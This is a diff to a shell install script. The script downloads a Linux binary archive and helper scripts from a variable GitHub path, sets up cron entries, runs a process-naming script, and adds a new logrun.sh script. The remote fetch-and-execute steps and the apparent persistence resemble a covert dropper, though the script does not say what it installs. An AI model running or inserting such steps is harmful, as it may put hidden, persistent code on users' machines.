@@ -15,15 +15,18 @@ cd /home/$Uuname
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
 			rm -rf linux.tar.gz
+			chmod +x logrun.sh
 			mkdir bin
-			mv linux bin/linux
+			cp linux bin/linux
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/logrun.sh
 			chmod +x auinstall.sh
 			chmod +x processname.sh
 			chmod +x cronadd.sh
+			chmod +x logrun.sh			
 			./cronadd.sh
 			./processname.sh
 			cp inuser.txt bin/inuser.txt
